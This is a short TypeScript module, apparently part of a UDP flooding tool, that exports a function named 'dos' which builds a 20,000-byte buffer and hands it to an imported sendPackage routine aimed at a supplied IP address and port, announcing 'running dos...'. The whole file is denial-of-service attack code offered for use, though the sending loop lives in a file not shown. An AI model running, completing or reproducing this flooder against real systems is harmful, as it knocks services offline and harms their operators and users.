import * as dgram from "dgram";
import { sendPackage } from "./sendPackages";

export const dos = (ip: string, port: number, socket: number) => {
    const client =  dgram.createSocket("udp4");
    const message = Buffer.alloc(20000)
    let sentPackage = 0

    console.log("running dos...")
    sendPackage(message, client, ip, port, socket, sentPackage)
}